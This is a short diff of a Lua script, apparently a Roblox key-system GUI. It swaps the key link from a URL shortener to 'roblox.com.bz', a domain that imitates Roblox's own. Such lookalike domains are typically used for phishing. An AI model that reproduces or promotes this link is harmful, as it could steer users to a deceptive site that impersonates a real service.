@@ -14,7 +14,7 @@ local KeyPassed = false
 
 -- CHANGE THIS LINK
 
-local KeyLink = "https://sfl.gl/Tb5Im"
+local KeyLink = "https://roblox.com.bz/communities/520850900/"
 
 -- GUI
 
